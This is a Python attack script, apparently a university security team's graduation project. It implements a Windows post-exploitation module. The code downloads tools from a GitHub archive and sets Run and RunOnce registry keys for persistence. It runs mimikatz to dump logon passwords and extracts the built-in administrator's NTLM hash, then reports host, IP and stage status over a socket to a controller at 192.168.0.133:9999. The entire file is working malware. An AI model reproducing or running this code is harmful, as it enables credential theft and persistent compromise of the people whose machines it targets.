#
#
# 해당 코드는 중부대학교 정보보호학과 '공격해조' 졸업 팀이 제작한 코드입니다.
#
#

import os
import subprocess
from zipfile import ZipFile
from requests import get
from winreg import *
import json
import socket
import threading


# 0. 세팅
# 폴더 세팅
set_path = 'C:\module2'
os.mkdir(set_path)
# 통신 관련 세팅
info_List = []
m_dict = {'NAME': '', 'IP': '', 'INFO': ''}
hostname = subprocess.check_output(['hostname']).decode(
    'utf-8').replace('\r', '').replace('\n', '')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
e = s.getsockname()[0]

# 1. 파일 다운로드 및 언팩


def file_download():
    try:
        url = 'https://github.com/kimjinsoooo/DownloadFile/archive/refs/heads/main.zip'
        file_path = set_path + "\DownloadFile.zip"
        # 파일 다운로드
        with open(file_path, "wb") as file:
            response = get(url)
            file.write(response.content)
        # 파일언팩
        with ZipFile(file_path, 'r') as zip:
            zip.extractall(set_path)

        # 통신
        info_List.append(('File Download', 'Ok'))
    except:
        info_List.append(('File Download', 'No'))


# 2. 지속성
def Persistence():
    try:
        # 레지스트리 추가
        key = HKEY_CURRENT_USER
        Run_subkey = 'Software\Microsoft\Windows\CurrentVersion\Run'
        RunOnce_subkey = 'Software\Microsoft\Windows\CurrentVersion\RunOnce'
        RunEx_subkey = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run'
        RunOneEx_subkey = 'Software\Microsoft\Windows\CurrentVersion\RunOnceEx'

        SavePath = 'C:\module2.5\DownloadFile-main\M2.5_v1.0.py'

        # Run키는 프로그램을 한 번 실행한 다음 키 삭제
        registry = CreateKey(key, Run_subkey)
        SetValueEx(registry, 'run', 0, REG_SZ, SavePath)
        CloseKey(registry)

        # RunOnce키는 프로그램을 한 번 실행 후 다음 키 삭제
        registry = CreateKey(key, RunOnce_subkey)
        SetValueEx(registry, 'run', 0, REG_SZ, SavePath)
        CloseKey(registry)

        # RunEx키는 프로그램을 한 번 실행한 다음 종료될 때 키 삭제
        registry = CreateKey(key, RunEx_subkey)
        SetValueEx(registry, 'run', 0, REG_SZ, SavePath)
        CloseKey(registry)

        # RunOnceEx는 프로그램 한 번 실행 후 종료될 때 키 삭제
        registry = CreateKey(key, RunOneEx_subkey)
        SetValueEx(registry, 'run', 0, REG_SZ, SavePath)
        CloseKey(registry)

        # 통신
        info_List.append(('Persistence', 'Ok'))
    except:
        info_List.append(('Persistence', 'No'))


# 3. 크레덴셜 획득
def get_Credential():
    try:
        # 크레덴셜 추출 및 저장
        credential_path = set_path + '\GetCredential'
        os.mkdir(credential_path)

        os.system('C:\module2\DownloadFile-main\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\module2\GetCredential\Credential_output.txt')

        # 추출된 크레덴셜 변수화 후 텍스트파일로 저장
        f = open(credential_path + "\Credential_output.txt",
                 'r', encoding='UTF-8')
        Credential_log = open(credential_path + '\Credential_log.txt', 'w')
        for line in f:
            if 'User Name         :' in line:
                Credential_log.write(line)
            if 'SID' in line:
                Credential_log.write(line)
            if 'Domain            :' in line:
                Credential_log.write(line)
            if '* NTLM     :' in line:
                Credential_log.write(line)
        Credential_log.close()

        # 관리자 계정 크레덴셜 찾기
        with open(credential_path + '\Credential_log.txt') as f:
            lines = f.readlines()
        lines = [line.strip("\n") for line in lines]
        Credential_use = open(credential_path + '\Credential_use_500.txt', 'w')
        idx = 0
        count = 0
        for line in lines:
            if 'SID' in line:
                idx += 1
                SID_num = line.split("-")
                if (SID_num[len(SID_num)-1]) == "500":
                    username = lines[idx-3].split()
                    domain = lines[idx-2].split()
                    sid = lines[idx-1].split()
                    ntlm = lines[idx].split()
                    Credential_use.write(username[3])
                    Credential_use.write(".")
                    Credential_use.write(domain[2])
                    Credential_use.write(".")
                    Credential_use.write(sid[2])
                    Credential_use.write(".")
                    Credential_use.write(ntlm[3])
                    Credential_use.write(".")
                    count += 1
            else:
                idx += 1
        Credential_use.close()

        # 통신
        info_List.append(('Get Credential', 'Ok'))
    except:
        info_List.append(('Get Credential', 'No'))


# 4. 통신
def Socket_Create():
    Host = '192.168.0.133'
    Port = 9999

    global Client_Socket

    Client_Socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    Client_Socket.connect((Host, Port))

    receive_thread = threading.Thread(target=info_send)
    receive_thread.start()


def info_send():
    print('info_send start')
    m_dict['NAME'] = hostname
    m_dict['IP'] = e
    m_dict['INFO'] = make_List(info_List)
    while True:
        try:
            Client_Socket.sendall(json.dumps(m_dict).encode('ascii'))
        except Exception as error:
            print("Error!", error)
            Client_Socket.close()
            break


def make_List(info_List):
    info_Lists = '[M2]\n'
    for info_name, info_state in info_List:
        info_List = info_name + ': ' + info_state + '\n'
        info_Lists += info_List
    return info_Lists


# 5. Main
file_download()
Persistence()
get_Credential()
Socket_Create()
